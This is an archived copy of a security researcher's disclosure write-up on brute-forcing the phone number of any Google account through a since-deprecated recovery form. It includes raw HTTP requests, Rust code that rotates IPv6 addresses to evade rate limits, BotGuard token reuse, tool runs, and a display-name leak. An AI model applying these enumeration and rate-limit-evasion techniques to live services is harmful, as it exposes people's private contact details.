@@ -1,0 +1,329 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Leaking the phone number of any Google user | rss-cache archive</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --bg: #f6f2ea;
+        --card: #fffdfa;
+        --text: #1f2933;
+        --muted: #52606d;
+        --border: #d9cbb8;
+        --accent: #b05a33;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        font-family: Georgia, "Iowan Old Style", "Palatino Linotype", serif;
+        color: var(--text);
+        background: linear-gradient(180deg, #fbf8f2 0%, var(--bg) 100%);
+      }
+      main {
+        max-width: 820px;
+        margin: 0 auto;
+        padding: 2.5rem 1.25rem 4rem;
+      }
+      article {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 1.5rem;
+      }
+      h1 {
+        margin-top: 0;
+        font-size: clamp(2rem, 4vw, 3rem);
+        line-height: 1.05;
+      }
+      .meta {
+        color: var(--muted);
+        margin-bottom: 1.2rem;
+      }
+      .links {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+        margin-bottom: 1.5rem;
+      }
+      .links a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      .summary {
+        border-left: 4px solid var(--border);
+        padding-left: 1rem;
+        color: var(--muted);
+        margin-bottom: 1.5rem;
+      }
+      img {
+        max-width: 100%;
+        height: auto;
+      }
+      pre {
+        white-space: pre-wrap;
+        overflow-wrap: anywhere;
+      }
+      a {
+        color: var(--accent);
+      }
+    </style>
+  </head>
+  <body>
+    <main>
+      <article>
+        <h1>Leaking the phone number of any Google user</h1>
+        <div class="meta">skull&#x27;s blog 2025-06-09T00:00:00Z</div>
+        <div class="links">
+          <a href="https://brutecat.com/articles/leaking-google-phones">Original article</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/archive/articles/brutecat-com/brutecat-com-eedf4135366a0414.json">Archive JSON</a>
+          <a href="https://ThinkPeace.github.io/rss-cache/">rss-cache home</a>
+        </div>
+        <div class="summary">From rate limits to no limits: How IPv6&#x27;s massive address space and a crafty botguard bypass left every Google user&#x27;s phone number vulnerable</div>
+        <div class="content">
+          <p>A few months ago, I disabled javascript on my browser while testing if there were any Google services left that still worked without JS in the modern web. Interestingly enough, the username recovery form still worked!</p>
+</br>
+
+<div class="embedded-content" data-embed-src="/articles/embeds/leaking-google-phones/username_recovery.html"></div>
+
+</br>
+
+<p>This surprised me, as I used to think these account recovery forms <a href="https://news.ycombinator.com/item?id=18349887" >required javascript since 2018</a> as they relied on botguard solutions generated from heavily obfuscated proof-of-work javascript code for anti-abuse.</p>
+<h3 id="a-deeper-look-into-the-endpoints">A deeper look into the endpoints</h3><p>The username recovery form seemed to allow you to check if a recovery email or phone number was associated with a specific display name. This required 2 HTTP requests:</p>
+</br>
+
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/signin/usernamerecovery</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>accounts.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>__Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>81
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Email=+18085921029&amp;hl=en&amp;gxf=AFoagUVs61GL09C_ItVbtSsQB4utNqVgKg%3A1747557783359</code></pre><blockquote>
+<p>The cookie and gxf values are from the initial page HTML</p>
+</blockquote>
+</br>
+
+<p><strong>Response</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">302</span> Found
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8
+<span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://accounts.google.com/signin/usernamerecovery/name?ess=..&lt;SNIP&gt;..&amp;hl=en</code></pre><p>This gave us a <code>ess</code> value tied to that phone number we can use for the next HTTP request.</p>
+</br>
+
+<p><strong>Request</strong></p>
+<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/signin/usernamerecovery/lookup</span> <span class="hljs-meta">HTTP/2</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>accounts.google.com
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>__Host-GAPS=1:a4zTWE1Z3InZb82rIfoPe5aRzQNnkg:0D49ErWahX1nGW0o
+<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>https://accounts.google.com
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i
+
+<span class="language-xml">challengeId=0&amp;challengeType=28&amp;ess=<span class="hljs-tag">&lt;<span class="hljs-name">snip</span>&gt;</span>&amp;bgresponse=js_disabled&amp;GivenName=john&amp;FamilyName=smith</span></code></pre><p>This request allows us to check if a Google account exists with that phone number as well as the display name <code>&quot;John Smith&quot;</code>. </p>
+</br>
+
+<p><strong>Response</strong> (no account found)</p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">302</span> Found
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8
+<span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://accounts.google.com/signin/usernamerecovery/noaccountsfound?ess=...</code></pre></br>
+
+<p><strong>Response</strong> (account found)</p>
+<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">302</span> Found
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8
+<span class="hljs-attribute">Location</span><span class="hljs-punctuation">: </span>https://accounts.google.com/signin/usernamerecovery/challenge?ess=...</code></pre><h3 id="can-we-even-brute-this-">Can we even brute this?</h3><p>My first attempts were futile. It seemed to ratelimit your IP address after a few requests and present a captcha.</p>
+</br>
+
+<div class="embedded-content" data-embed-src="/articles/embeds/leaking-google-phones/captcha.html" data-embed-height="500"></div>
+
+</br>
+
+<p>Perhaps we could use proxies to get around this? If we take Netherlands as an example, the <a href="https://g.co/AccountRecoveryRequest" >forgot password flow</a> provides us with the phone hint <code>•• ••••••03</code></p>
+</br>
+
+<p>For Netherlands mobile numbers, they always start with <code>06</code>, meaning there&#39;s 6 digits we&#39;d have to brute. 10**6 = 1,000,000 numbers. That might be doable with proxies, but there had to be a better way.</p>
+<h3 id="what-about-ipv6-">What about IPv6?</h3><p>Most service providers like <a href="https://vultr.com" >Vultr</a> provide /64 ip ranges, which provide us with 18,446,744,073,709,551,616 addresses. In theory, we could use IPv6 and rotate the IP address we use for every request, bypassing this ratelimit.</p>
+</br>
+
+<p>The HTTP server also seemed to support IPv6:</p>
+<pre><code class="hljs language-bash">~ $ curl -6 https://accounts.google.com
+&lt;HTML&gt;
+&lt;HEAD&gt;
+&lt;TITLE&gt;Moved Temporarily&lt;/TITLE&gt;
+&lt;/HEAD&gt;
+&lt;BODY BGCOLOR=<span class="hljs-string">&quot;#FFFFFF&quot;</span> TEXT=<span class="hljs-string">&quot;#000000&quot;</span>&gt;
+&lt;!-- GSE Default Error --&gt;
+&lt;H1&gt;Moved Temporarily&lt;/H1&gt;
+The document has moved &lt;A HREF=<span class="hljs-string">&quot;https://accounts.google.com/ServiceLogin?passive=1209600&amp;amp;continue=https%3A%2F%2Faccounts.google.com%2F&amp;amp;followup=https%3A%2F%2Faccounts.google.com%2F&quot;</span>&gt;here&lt;/A&gt;.
+&lt;/BODY&gt;
+&lt;/HTML&gt;</code></pre><p>To test this out, I routed my IPv6 range through my network interface and I started work on <a href="https://github.com/ddd/gpb" >gpb</a>, using <a href="https://docs.rs/reqwest/latest/reqwest/struct.ClientBuilder.html#method.local_address" >reqwest's local_address method</a> on its <code>ClientBuilder</code> to set my IP address to a random IP on my subnet:</p>
+</br>
+
+<pre><code class="hljs language-rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_rand_ipv6</span>(subnet: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> IpAddr {
+    <span class="hljs-keyword">let</span> (ipv6, prefix_len) = <span class="hljs-keyword">match</span> subnet.parse::&lt;Ipv6Cidr&gt;() {
+        <span class="hljs-title function_ invoke__">Ok</span>(cidr) =&gt; {
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">ipv6</span> = cidr.<span class="hljs-title function_ invoke__">first_address</span>();
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">length</span> = cidr.<span class="hljs-title function_ invoke__">network_length</span>();
+            (ipv6, length)
+        }
+        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; {
+            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;invalid IPv6 subnet&quot;</span>);
+        }
+    };
+
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">ipv6_u128</span>: <span class="hljs-type">u128</span> = <span class="hljs-type">u128</span>::<span class="hljs-title function_ invoke__">from</span>(ipv6);
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">rand</span>: <span class="hljs-type">u128</span> = <span class="hljs-title function_ invoke__">random</span>();
+
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">net_part</span> = (ipv6_u128 &gt;&gt; (<span class="hljs-number">128</span> - prefix_len)) &lt;&lt; (<span class="hljs-number">128</span> - prefix_len);
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">host_part</span> = (rand &lt;&lt; prefix_len) &gt;&gt; prefix_len;
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">result</span> = net_part | host_part;
+
+    IpAddr::<span class="hljs-title function_ invoke__">V6</span>(Ipv6Addr::<span class="hljs-title function_ invoke__">from</span>(result))
+}
+
+<span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">create_client</span>(subnet: &amp;<span class="hljs-type">str</span>, user_agent: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> Client {
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">ip</span> = <span class="hljs-title function_ invoke__">get_rand_ipv6</span>(subnet);
+
+    Client::<span class="hljs-title function_ invoke__">builder</span>()
+        .<span class="hljs-title function_ invoke__">redirect</span>(redirect::Policy::<span class="hljs-title function_ invoke__">none</span>())
+        .<span class="hljs-title function_ invoke__">danger_accept_invalid_certs</span>(<span class="hljs-literal">true</span>)
+        .<span class="hljs-title function_ invoke__">user_agent</span>(user_agent)
+        .<span class="hljs-title function_ invoke__">local_address</span>(<span class="hljs-title function_ invoke__">Some</span>(ip))
+        .<span class="hljs-title function_ invoke__">build</span>().<span class="hljs-title function_ invoke__">unwrap</span>()
+}</code></pre><p>Eventually, I had a PoC running, but I was still getting the captcha? It seemed that for whatever reason, datacenter IP addresses using the JS disabled form were always presented with a captcha, damn!</p>
+<h3 id="using-the-botguard-token-from-the-js-form">Using the BotGuard token from the JS form</h3><p>I was looking through the 2 requests again, seeing if there was anything I could find to get around this, and <code>bgresponse=js_disabled</code> caught my eye. I remembered that on the <a href="https://accounts.google.com/signin/v2/usernamerecovery" >JS-enabled account recovery form</a>, the botguard token was passed via the <strong>bgRequest</strong> parameter.</p>
+</br>
+
+<p><img src="/assets/leaking-google-phones/bgtoken.png" alt=""  /></p>
+</br>
+
+<p>What if I replace <code>js_disabled</code> with the botguard token from the JS-enabled form request? I tested it out, and <strong>it worked??</strong>. The botguard token seemed to have no request limit on the No-JS form, but who are all these random people?</p>
+<pre><code class="hljs language-bash">$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 -f Henry -l Chancellor -w 3000
+Starting with 3000 threads...
+HIT: +31612345603
+HIT: +31623456703
+HIT: +31634567803
+HIT: +31645678903
+HIT: +31656789003
+HIT: +31658854003
+HIT: +31667890103
+HIT: +31678901203
+HIT: +31689012303
+HIT: +31690123403
+HIT: +31701234503
+HIT: +31712345603
+HIT: +31723456703</code></pre><p>It took me a bit to realize this, but those were all people who had the Google account name &quot;Henry&quot; with no last name set, as well as a phone with the last 2 digits <strong>03</strong>. For those numbers, it would return <code>usernamerecovery/challenge</code> for the first name Henry and <strong>any last name</strong>.</p>
+</br>
+
+<p>I added some extra code to validate a possible hit with the first name, and a random last name like <code>0fasfk1AFko1wf</code>. If it still claimed it was a hit, it would be filtered out, and there we go:</p>
+<pre><code class="hljs language-bash">$ ./target/release/gpb --prefix +316 --suffix 03 --digits 6 --firstname Henry --lastname Chancellor --workers 3000
+Starting with 3000 threads...
+HIT: +31658854003
+Finished.</code></pre><blockquote>
+<p>In practise, it&#39;s unlikely to get more than one hit as it&#39;s uncommon for another Google user to have the same full display name, last 2 digits as well as country code. </p>
+</blockquote>
+<h3 id="a-few-things-to-sort-out">A few things to sort out</h3><p>We have a basic PoC working, but there&#39;s still some issues we have to address.</p>
+<ul>
+<li><p><a href="#how-do-we-know-which-country-code-a-victim-39-s-phone-is-" >How do we know which country code a victim's phone is?</a></p>
+</li>
+<li><p><a href="#how-do-we-get-the-victim-39-s-google-account-display-name-" >How do we get the victim's Google account display name?</a></p>
+</li>
+</ul>
+</br>
+
+<h4 id="how-do-we-know-which-country-code-a-victim-39-s-phone-is-">How do we know which country code a victim&#39;s phone is?</h4><p>Interestingly enough, it&#39;s possible for us to figure out the country code based off of the phone mask that the <a href="https://g.co/AccountRecoveryRequest" >forgot password flow</a> provides us. Google actually just uses <a href="https://github.com/google/libphonenumber" >libphonenumbers</a>&#39;s &quot;national format&quot; for each number.</p>
+<p>Here&#39;s some examples:</p>
+<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+    ...
+    <span class="hljs-attr">&quot;• (•••) •••-••-••&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;ru&quot;</span>
+    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;•• ••••••••&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;nl&quot;</span>
+    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;••••• ••••••&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;gb&quot;</span>
+    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">&quot;(•••) •••-••••&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
+        <span class="hljs-string">&quot;us&quot;</span>
+    <span class="hljs-punctuation">]</span>
+<span class="hljs-punctuation">}</span></code></pre><p>I wrote a script that collected the masked national format for all countries as <a href="https://github.com/ddd/gpb/blob/main/data/mask.json" >mask.json</a> </p>
+</br>
+
+<h4 id="how-do-we-get-the-victim-39-s-google-account-display-name-">How do we get the victim&#39;s Google account display name?</h4><p>Initially in 2023, Google changed their policy to only show names if there was direct interaction from the target to you (emails, shared docs, etc.), so they slowly removed names from endpoints. By April 2024, they updated their Internal People API service to completely stop returning display names for unauthenticated accounts, removing display names almost everywhere. </p>
+</br>
+
+<p>It was going to be tricky to find a display name leak after all that, but eventually after looking through random Google products, I found out that I could create a <a href="https://lookerstudio.google.com" >Looker Studio</a> document, transfer ownership of it to the victim, and the victim&#39;s display name would leak on the home page, <strong>with 0 interaction required from the victim</strong>:</p>
+</br>
+
+<div class="embedded-content" data-embed-src="/articles/embeds/leaking-google-phones/looker_studio.html" data-embed-height="150"></div>
+
+</br>
+
+<h4 id="optimizing-it-further">Optimizing it further</h4><p>By using <a href="https://github.com/google/libphonenumber" >libphonenumbers</a>&#39;s number validation, I was able to generate a <a href="https://github.com/ddd/gpb/blob/main/data/format.json" >format.json</a> with mobile phone prefix, known area codes and digits count for every country.</p>
+<pre><code class="hljs language-json"> ...
+  <span class="hljs-attr">&quot;nl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+        <span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;31&quot;</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;area_codes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;61&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;62&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;63&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;64&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;65&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;68&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">&quot;digits&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">7</span><span class="hljs-punctuation">]</span>
+    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
+ ...</code></pre></br>
+
+<p>I also implemented <a href="https://github.com/ddd/gpb/blob/main/src/workers/workers.rs#L63" >real-time libphonenumber validation</a> to reduce queries to Google&#39;s API for invalid numbers. For the botguard token, I wrote a <a href="https://github.com/ddd/gpb/tree/main/tools/bg_gen" >Go script</a> using <a href="https://github.com/chromedp/chromedp" >chromedp</a> that lets you generate BotGuard tokens with just a simple API call:</p>
+<pre><code class="hljs language-bash">$ curl http://localhost:7912/api/generate_bgtoken
+{
+  <span class="hljs-string">&quot;bgToken&quot;</span>: <span class="hljs-string">&quot;&lt;generated_botguard_token&gt;&quot;</span>
+}</code></pre><h3 id="putting-it-all-together">Putting it all together</h3><p>We basically have the full attack chain, we just have to put it together.</p>
+<ul>
+<li>Leak the Google account display name via Looker Studio</li>
+<li>Go through <a href="https://g.co/AccountRecoveryRequest" >forgot password flow</a> for that email and get the masked phone</li>
+<li>Run the <code>gpb</code> program with the display name and masked phone to bruteforce the phone number</li>
+</ul>
+</br>
+
+
+
+<h3 id="time-required-to-brute-the-number">Time required to brute the number</h3><p>Using a $0.30/hour server with consumer-grade specs (16 vcpu), I&#39;m able to achieve ~40k checks per second.</p>
+<p>With just the last 2 digits from the <a href="https://g.co/AccountRecoveryRequest" >Forgot Password flow</a> phone hint:</p>
+<table>
+<thead>
+<tr>
+<th>Country code</th>
+<th>Time required</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>United States (+1)</td>
+<td>20 mins</td>
+</tr>
+<tr>
+<td>United Kingdom (+44)</td>
+<td>4 mins</td>
+</tr>
+<tr>
+<td>Netherlands (+31)</td>
+<td>15 secs</td>
+</tr>
+<tr>
+<td>Singapore (+65)</td>
+<td>5 secs</td>
+</tr>
+</tbody></table>
+<p>This time can also be significantly reduced through phone number hints from password reset flows in other services such as PayPal, which provide several more digits (ex. <code>+14•••••1779</code>)</p>
+<h3 id="timeline">Timeline</h3><ul>
+<li>2025-04-14 - Report sent to vendor</li>
+<li>2025-04-15 - Vendor triaged report</li>
+<li>2025-04-25 - 🎉 <strong>Nice catch!</strong></li>
+<li>2025-05-15 - <strong>Panel awards $1,337 + swag.</strong> Rationale: Exploitation likelihood is low. (lol)<br>Issue qualified as an abuse-related methodology with high impact. </li>
+<li>2025-05-15 - Appeal reward reason: <a href="https://bughunters.google.com/about/rules/google-friends/5238081279623168/abuse-vulnerability-reward-program-rules#reward-amounts-for-abuse-related-vulnerabilities" >As per the Abuse VRP table</a>, probability/exploitability is decided based on pre-requisites required for this attack and whether the victim can discover exploitation. For this attack, there are no pre-requisites and it cannot be discovered by the victim.</li>
+<li>2025-05-22 - <strong>Panel awards an additional $3,663.</strong> Rationale: Thanks for your feedback on our initial reward. We took your points into consideration and discussed at some length. We&#39;re happy to share that we&#39;ve upgraded likelihood to medium and adjusted the reward to a total of $5,000 (plus the swag code we&#39;ve already sent). Thanks for the report, and we look forward to your next one.</li>
+<li>2025-05-22 - Vendor confirms they have rolled out inflight mitigations while endpoint deprecation rolls out worldwide.</li>
+<li>2025-05-22 - Coordinates disclosure with vendor for <em>2025-06-09</em></li>
+<li>2025-06-06 - Vendor confirms that the No-JS username recovery form has been fully deprecated</li>
+<li>2025-06-09 - Report disclosed</li>
+</ul>
+        </div>
+      </article>
+    </main>
+  </body>
+</html>
